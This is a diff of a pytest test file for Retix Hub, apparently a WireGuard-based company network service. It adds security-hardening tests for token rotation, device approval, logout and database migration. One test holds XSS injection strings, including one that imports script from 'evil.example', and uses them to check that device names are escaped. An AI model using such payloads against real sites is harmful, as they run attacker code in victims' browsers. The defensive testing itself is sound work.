@@ -122,8 +122,11 @@ class TestRegister:
         first = ctx.register("firma1", "PC1")
         again = ctx.register("firma1", "PC1-новое", key=first["_key"])
         assert again["ip"] == first["ip"] and again["device_id"] == first["device_id"]
-        assert ctx.api.get("/api/me", headers=ctx.h(first["token"])).status_code == 401
         assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["device_name"] == "PC1-новое"
+        # прежний токен после повторного входа — только у копии: ПК отключается до одобрения
+        r = ctx.api.get("/api/me", headers=ctx.h(first["token"]))
+        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
+        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).status_code == 401
 
     def test_same_key_other_company_conflict(self, ctx):
         ctx.company("firma1"); ctx.company("firma2")
@@ -597,3 +600,135 @@ class TestPublic:
     def test_cabinet_header_links_home(self, ctx):
         ctx.company("firma1")
         assert 'href="/"><b>Retix Hub</b>' in ctx.cabinet("firma1").get("/cabinet").text
+
+
+# ---------------------------------------------------------------- 1.0.5: исправления аудита безопасности
+
+class TestHardening:
+    def test_device_name_cannot_inject_js(self, ctx):
+        # имя ПК раньше попадало в onsubmit="confirm('…')": &#39; браузер раскодирует — код исполнялся
+        cid = ctx.company("firma1")
+        evil = "x');import('//evil.example/a.js');('"
+        ctx.register("firma1", name=evil)
+        for page in (ctx.cabinet("firma1").get("/cabinet").text, ctx.admin.get(f"/admin/companies/{cid}").text):
+            assert "onsubmit=" not in page
+            assert 'data-confirm="Удалить x&#39;);import(&#39;//evil.example/a.js&#39;);(&#39;?' in page
+        ctx.register("firma1", name='"><img src=x onerror=alert(1)>')
+        assert "<img src=x" not in ctx.cabinet("firma1").get("/cabinet").text
+
+    def test_kick_all_removes_devices_from_wireguard(self, ctx, net):
+        ctx.company("firma1")
+        a, b = ctx.register("firma1", "A"), ctx.register("firma1", "B")
+        assert {a["_key"], b["_key"]} <= net["peers"].keys()
+        ctx.cabinet("firma1").post("/cabinet/join-password", data={"new_password": "newjoin1", "kick_all": "1"})
+        assert net["peers"] == {}                      # не только API — и сеть: ключ на ПК больше не пускает
+        again = ctx.register("firma1", "A", join="newjoin1", key=a["_key"])
+        assert again["status"] == "active" and a["_key"] in net["peers"] and b["_key"] not in net["peers"]
+
+    def test_new_company_requires_approval_by_default(self, ctx, net):
+        ctx.company("firma1", approval=True)
+        cab = ctx.cabinet("firma1")
+        assert 'name="require_approval" value="1" checked' in cab.get("/cabinet").text
+        d = ctx.register("firma1")
+        assert d["status"] == "pending" and d["_key"] not in net["peers"]
+        cab.post(f"/cabinet/devices/{d['device_id']}/approve")
+        assert d["_key"] in net["peers"]
+
+    def test_token_rotates_and_copy_disconnects_device(self, ctx, net, monkeypatch):
+        from app import db
+        from app.routers import api_client
+        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
+        ctx.company("firma1")
+        d = ctx.register("firma1")
+        t1 = d["token"]
+        r = ctx.api.get("/api/me", headers=ctx.h(t1))
+        t2 = r.headers["x-retix-token"]
+        assert r.status_code == 200 and t2 and t2 != t1
+        # пока клиент не пришёл с новым токеном, старый действует (ответ мог потеряться)
+        assert ctx.api.get("/api/me", headers=ctx.h(t1)).status_code == 200
+        assert ctx.api.get("/api/peers", headers=ctx.h(t2)).status_code == 200   # клиент перешёл на t2
+        # t1 теперь только у копии: ПК отключается, ждёт одобрения, снят с wg0
+        r = ctx.api.get("/api/me", headers=ctx.h(t1))
+        assert r.status_code == 401 and "другом компьютере" in r.json()["detail"]
+        assert ctx.api.get("/api/me", headers=ctx.h(t2)).status_code == 401
+        assert d["_key"] not in net["peers"]
+        conn = db.connect()
+        assert conn.execute("SELECT is_approved FROM devices WHERE id=?", (d["device_id"],)).fetchone()[0] == 0
+        assert conn.execute("SELECT COUNT(*) FROM audit_log WHERE action='token_reuse'").fetchone()[0] == 1
+        # вход паролем снова возможен, но только после одобрения администратором
+        again = ctx.register("firma1", key=d["_key"])
+        assert again["status"] == "pending" and d["_key"] not in net["peers"]
+        ctx.cabinet("firma1").post(f"/cabinet/devices/{d['device_id']}/approve")
+        assert ctx.api.get("/api/me", headers=ctx.h(again["token"])).json()["status"] == "active"
+
+    def test_lost_rotation_response_is_harmless(self, ctx, monkeypatch):
+        from app.routers import api_client
+        monkeypatch.setattr(api_client, "TOKEN_ROTATE_SECONDS", 0)
+        monkeypatch.setattr(api_client, "NEXT_TOKEN_RETRY", 0)
+        ctx.company("firma1")
+        t1 = ctx.register("firma1")["token"]
+        lost = ctx.api.get("/api/me", headers=ctx.h(t1)).headers["x-retix-token"]   # ответ «потерялся»
+        for _ in range(3):
+            r = ctx.api.get("/api/me", headers=ctx.h(t1))
+            assert r.status_code == 200
+        t3 = r.headers["x-retix-token"]
+        assert t3 != lost
+        assert ctx.api.get("/api/me", headers=ctx.h(t3)).status_code == 200
+        # невостребованный токен — просто недействителен, ПК не отключается
+        assert ctx.api.get("/api/me", headers=ctx.h(lost)).status_code == 401
+        assert ctx.api.get("/api/me", headers=ctx.h(t3)).json()["status"] == "active"
+
+    def test_no_rotation_before_interval(self, ctx):
+        ctx.company("firma1")
+        t = ctx.register("firma1")["token"]
+        assert "x-retix-token" not in ctx.api.get("/api/me", headers=ctx.h(t)).headers
+
+    def test_logout_revokes_token_and_peer(self, ctx, net):
+        ctx.company("firma1")
+        d = ctx.register("firma1")
+        assert ctx.api.post("/api/logout", headers=ctx.h(d["token"])).json() == {"ok": True}
+        assert ctx.api.get("/api/me", headers=ctx.h(d["token"])).status_code == 401
+        assert d["_key"] not in net["peers"]
+        assert ctx.register("firma1", key=d["_key"])["status"] == "active"   # вход заново — без одобрения
+
+    def test_client_version_for_autoupdate(self, ctx):
+        import hashlib
+        import os
+        from app.config import DOWNLOADS_DIR
+        c = ctx.TestClient(ctx.app)
+        os.makedirs(DOWNLOADS_DIR, exist_ok=True)
+        assert c.get("/api/client/version").json() == {"version": None}
+        files = {"RetixHub_Setup_1.0.9.exe": b"MZ-109", "RetixHub_Setup_1.0.10.exe": b"MZ-1010" * 100}
+        for name, data in files.items():
+            with open(os.path.join(DOWNLOADS_DIR, name), "wb") as f:
+                f.write(data)
+        try:
+            info = c.get("/api/client/version").json()
+            assert info["version"] == "1.0.10" and info["size"] == 700
+            assert info["sha256"] == hashlib.sha256(b"MZ-1010" * 100).hexdigest()
+            assert c.get(info["url"]).content == b"MZ-1010" * 100
+        finally:
+            for name in files:
+                os.remove(os.path.join(DOWNLOADS_DIR, name))
+
+    def test_old_database_is_migrated(self, monkeypatch, tmp_path):
+        import sqlite3
+        from app import db
+        path = tmp_path / "old.db"
+        old = sqlite3.connect(path)
+        old.executescript("""CREATE TABLE companies (id INTEGER PRIMARY KEY, login TEXT, name TEXT DEFAULT '',
+            cabinet_pass_hash TEXT, join_pass_hash TEXT, subnet_index INTEGER, max_devices INTEGER DEFAULT 20,
+            require_approval INTEGER DEFAULT 0, full_lan INTEGER DEFAULT 0, share_name TEXT DEFAULT 'share',
+            share_ports TEXT DEFAULT '445', is_active INTEGER DEFAULT 1, created_at TEXT);
+            CREATE TABLE devices (id INTEGER PRIMARY KEY, company_id INTEGER, name TEXT, hostname TEXT DEFAULT '',
+            public_key TEXT UNIQUE, ip TEXT UNIQUE, token_hash TEXT UNIQUE, is_share_host INTEGER DEFAULT 0,
+            is_blocked INTEGER DEFAULT 0, is_approved INTEGER DEFAULT 1, client_version TEXT DEFAULT '',
+            last_handshake INTEGER DEFAULT 0, endpoint TEXT DEFAULT '', last_seen TEXT, created_at TEXT);
+            INSERT INTO devices(company_id, name, public_key, ip, token_hash) VALUES (1, 'PC', 'k', '10.66.1.2', 'h');""")
+        old.commit(); old.close()
+        monkeypatch.setattr(db, "DB_PATH", str(path))
+        db.init(); db.init()   # повторный запуск ничего не ломает
+        conn = db.connect()
+        row = conn.execute("SELECT token_hash, token_next_hash, token_set_at FROM devices").fetchone()
+        assert tuple(row) == ("h", None, 0)
+        conn.execute("SELECT COUNT(*) FROM token_history").fetchone()
